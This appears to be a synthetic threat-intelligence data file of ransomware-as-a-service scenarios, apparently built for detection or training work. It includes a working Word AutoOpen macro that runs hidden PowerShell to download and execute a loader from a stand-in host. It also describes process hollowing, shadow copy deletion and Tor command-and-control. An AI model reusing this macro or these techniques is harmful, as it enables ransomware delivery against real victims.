samples.scenario: A Ransomware-as-a-Service affiliate leverages a malicious macro embedded in a Word document to drop a Cobalt Strike beacon which then downloads and executes a ransomware payload. The ransomware uses a custom encryption algorithm and disables Volume Shadow Copy Service to prevent data recovery. The payload communicates over HTTPS with a Tor hidden service C2 for command and key exchange.

Sub AutoOpen()
 Dim objShell As Object
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell -windowstyle hidden -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.example.net/loader.ps1')\""
End Sub

samples.scenario: An affiliate in a Ransomware-as-a-Service campaign delivers ransomware via a malicious Windows Installer (.msi) package distributed through compromised software update servers. The installer executes a dropper that injects the ransomware payload into a critical system process to evade detection. The ransomware encrypts files and uses a hardcoded Tor C2 address for receiving encryption keys and instructions.

technical_data.dropper_behavior: Executes rundll32.exe to load injected_ransomware.dll into svchost.exe process via process hollowing.

samples.scenario: Ransomware-as-a-Service affiliate leverages a compromised RDP session to deploy a C# based ransomware executable. Initial access is established via brute-force RDP attack. The ransomware uses a custom mutex and communicates with a cloud-based C2 server over HTTPS to retrieve encryption keys. The malware also deletes shadow copies to prevent recovery.
